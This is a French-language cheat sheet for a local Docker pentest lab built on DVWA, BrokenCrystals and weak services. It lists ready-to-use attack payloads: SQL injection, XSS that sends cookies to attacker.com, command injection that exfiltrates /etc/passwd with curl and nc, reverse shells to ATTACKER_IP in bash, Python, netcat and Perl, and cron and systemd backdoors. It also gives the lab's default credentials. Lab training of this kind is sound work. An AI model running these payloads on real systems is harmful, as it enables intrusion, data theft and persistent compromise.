# 📝 Cheat Sheet - Lab Pentest

Aide-mémoire rapide des commandes essentielles pour exploiter le lab.

---

## 🚀 Gestion du Lab

### Démarrage et Arrêt
```bash
# Démarrer le lab
docker-compose up -d

# Voir l'état
docker-compose ps

# Voir les logs
docker-compose logs -f [service]

# Arrêter
docker-compose stop

# Redémarrer
docker-compose restart

# Supprimer (garde les volumes)
docker-compose down

# Reset complet
docker-compose down -v
docker-compose up -d
```

### Accès aux Conteneurs
```bash
# Shell dans un conteneur
docker-compose exec brokencrystals sh
docker-compose exec postgres-db psql -U dbuser -d webapp

# Voir les ressources
docker stats
```

---

## 🔍 Reconnaissance

### Scan de Ports - Nmap
```bash
# Scan rapide
nmap -sV localhost

# Scan complet
nmap -sV -sC -p- localhost -oN scan_full.txt

# Scan de réseau
nmap -sn 172.20.0.0/24
nmap -sn 172.21.0.0/24

# Scan agressif
nmap -A localhost

# Scripts spécifiques
nmap --script=http-enum localhost -p 8080,8081,8082
nmap --script=mysql-enum localhost -p 3306
```

### Scan Web - Nuclei (Moderne)
```bash
# Installation
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Scan basique
nuclei -u http://localhost:8080

# Scan avec templates spécifiques
nuclei -u http://localhost:8082 -t exposures/

# Scan multiple targets
nuclei -l urls.txt

# Severity filter
nuclei -u http://localhost:8080 -severity critical,high
```

### Énumération Web - Classique
```bash
# Dirb
dirb http://localhost:8082 /usr/share/dirb/wordlists/common.txt

# Gobuster
gobuster dir -u http://localhost:8082 -w /usr/share/wordlists/dirb/common.txt

# Nikto (si nécessaire, mais préférer Nuclei)
nikto -h http://localhost:8082

# curl
curl -I http://localhost:8080
curl http://localhost:8082/robots.txt
curl http://localhost:8082/secrets/
```

---

## 🎯 Exploitation Web

### SQL Injection

#### Détection Manuelle
```sql
# Basic tests
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
admin' --
admin' #

# Time-based
' AND SLEEP(5) --
' AND BENCHMARK(5000000,MD5('test')) --
```

#### SQLMap
```bash
# Basique
sqlmap -u "http://localhost:8081/page.php?id=1"

# Avec cookie
sqlmap -u "http://localhost:8081/page.php?id=1" \
  --cookie="PHPSESSID=abc123; security=low"

# Énumérer les DB
sqlmap -u "URL" --dbs

# Tables
sqlmap -u "URL" -D dvwa --tables

# Dump
sqlmap -u "URL" -D dvwa -T users --dump

# Shell
sqlmap -u "URL" --os-shell
```

### XSS

#### Payloads Basiques
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

#### Payloads Avancés
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<script src="http://attacker.com/evil.js"></script>
```

### Command Injection
```bash
# Basic
; ls
| ls
|| ls
& ls
&& ls
` ls `
$( ls )

# Avec exfiltration
; curl http://attacker.com/?data=$(whoami)
; nc attacker.com 4444 < /etc/passwd
```

### GraphQL
```bash
# Introspection
curl -X POST http://localhost:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Queries
curl -X POST http://localhost:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } } }"}'

# Mutations
curl -X POST http://localhost:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(id: 1, role: \"admin\") { id role } }"}'
```

---

## 🔓 Accès Services

### FTP
```bash
# Connexion
ftp localhost 21
# Username: ftpuser
# Password: ftp123

# Commandes
ls
cd directory
get file.txt
put file.txt
mget *.txt
bye

# Anonymous
ftp localhost 21
# Username: anonymous
# Password: (vide)
```

### SSH
```bash
# Connexion
ssh admin@localhost -p 2222
# Password: admin123

# Avec clé
ssh -i private_key admin@localhost -p 2222

# Copie de fichiers
scp -P 2222 admin@localhost:/path/to/file .
scp -P 2222 local_file admin@localhost:/path/
```

### Brute Force - Hydra
```bash
# SSH
hydra -l admin -P passwords.txt ssh://localhost:2222

# FTP
hydra -l ftpuser -P passwords.txt ftp://localhost:21

# HTTP Basic Auth
hydra -l admin -P passwords.txt localhost http-get /admin/

# HTTP Form
hydra -l admin -P passwords.txt localhost http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

---

## 💾 Bases de Données

### PostgreSQL
```bash
# Connexion
psql -h localhost -p 5432 -U dbuser -d webapp
# Password: weak_password

# Commandes SQL
\l                          # Lister les databases
\c database_name            # Se connecter à une DB
\dt                         # Lister les tables
\d table_name               # Décrire une table
\du                         # Lister les users
SELECT version();           # Version
SELECT current_user;        # User actuel

# Extraction
SELECT * FROM users;
\copy (SELECT * FROM users) TO '/tmp/users.csv' CSV HEADER;

# Commandes système (si droits suffisants)
COPY (SELECT '') TO PROGRAM 'whoami';
```

### MySQL
```bash
# Connexion
mysql -h localhost -P 3306 -u root -p
# Password: root

# Commandes SQL
SHOW DATABASES;
USE database_name;
SHOW TABLES;
DESCRIBE table_name;
SELECT user, host FROM mysql.user;
SELECT @@version;

# Extraction
SELECT * FROM users;
SELECT * INTO OUTFILE '/tmp/users.txt' FROM users;

# Load File
SELECT LOAD_FILE('/etc/passwd');

# Commandes système (si droits suffisants)
SELECT sys_exec('whoami');
```

### Redis
```bash
# Connexion
redis-cli -h localhost -p 6379 -a redis123

# Commandes
INFO                        # Infos serveur
CONFIG GET *                # Configuration
KEYS *                      # Lister toutes les clés
GET key_name                # Lire une clé
SET key value               # Écrire une clé
DEL key                     # Supprimer une clé
FLUSHALL                    # Tout supprimer

# Dump sessions
KEYS session:*
GET session:abc123
```

---

## 🛠️ Post-Exploitation

### Énumération Linux
```bash
# Système
uname -a
cat /etc/os-release
cat /proc/version

# User
whoami
id
groups
sudo -l

# Réseau
ifconfig
ip addr
netstat -tulpn
ss -tulpn
cat /etc/hosts
cat /etc/resolv.conf

# Processus
ps aux
top
pstree

# Fichiers intéressants
find / -perm -4000 -type f 2>/dev/null    # SUID
find / -perm -2000 -type f 2>/dev/null    # SGID
find / -name "*.conf" 2>/dev/null
find / -name "*.bak" 2>/dev/null
find / -name "id_rsa" 2>/dev/null

# History
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
```

### Privilege Escalation
```bash
# Scripts automatiques
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Sudo exploit
sudo -l
sudo -u#-1 /bin/bash    # CVE-2019-14287

# SUID exploit
find / -perm -4000 -type f 2>/dev/null
/usr/bin/find . -exec /bin/sh \; -quit

# Capabilities
getcap -r / 2>/dev/null
```

### Persistance
```bash
# SSH backdoor
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Cron backdoor
(crontab -l ; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -

# Service backdoor
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor Service
[Service]
ExecStart=/tmp/backdoor.sh
[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor
systemctl start backdoor
```

### Reverse Shell
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/bash ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Listener (sur l'attaquant)
nc -lvnp 4444
```

---

## 📊 Burp Suite

### Configuration
```
Proxy > Options > Port: 8080
Intercept: On/Off
```

### Utilisation
1. Configurer le proxy dans le navigateur (127.0.0.1:8080)
2. Installer le certificat Burp (http://burp)
3. Intercepter les requêtes
4. Envoyer vers Repeater (Ctrl+R)
5. Envoyer vers Intruder pour fuzzing

### Intruder Payloads
```
# SQLi
' OR '1'='1
' OR '1'='1' --
admin' --

# XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# Brute force
wordlist: /usr/share/wordlists/rockyou.txt
```

---

## 🔐 Cracking

### John the Ripper
```bash
# Hashs Unix
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Formats spécifiques
john --format=md5crypt hashes.txt
john --format=sha512crypt hashes.txt

# Voir les formats
john --list=formats

# Afficher les résultats
john --show hashes.txt
```

### Hashcat
```bash
# MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA256
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# Modes
hashcat --help | grep "Hash modes"
```

---

## 📝 Documentation

### Screenshots
```bash
# Terminal
script -c "commande" output.txt

# Web
firefox --screenshot http://localhost:8080
```

### Notes
```bash
# Créer un fichier de notes
cat > notes.txt << 'EOF'
Date: 2024-11-19
Target: Lab Pentest
Findings:
- Service X vulnerable to Y
- Credentials found: user/pass
EOF
```

---

## 🎯 URLs et Ports du Lab

```
http://localhost:8080  - BrokenCrystals
http://localhost:8081  - DVWA
http://localhost:8082  - Nginx
http://localhost:8083  - Admin Panel
localhost:21           - FTP
localhost:2222         - SSH
localhost:3306         - MySQL
localhost:5432         - PostgreSQL
localhost:6379         - Redis
```

---

## 🔑 Credentials par Défaut

### Applications
```
BrokenCrystals: admin@acmecorp.local / Admin123!
DVWA: admin / password
Admin Panel: administrator / Admin@2023
```

### Services
```
FTP: ftpuser / ftp123
SSH: admin / admin123
PostgreSQL: dbuser / weak_password
MySQL: root / root
Redis: redis123
```

---

**💡 Conseil :** Gardez ce cheat sheet ouvert pendant vos tests !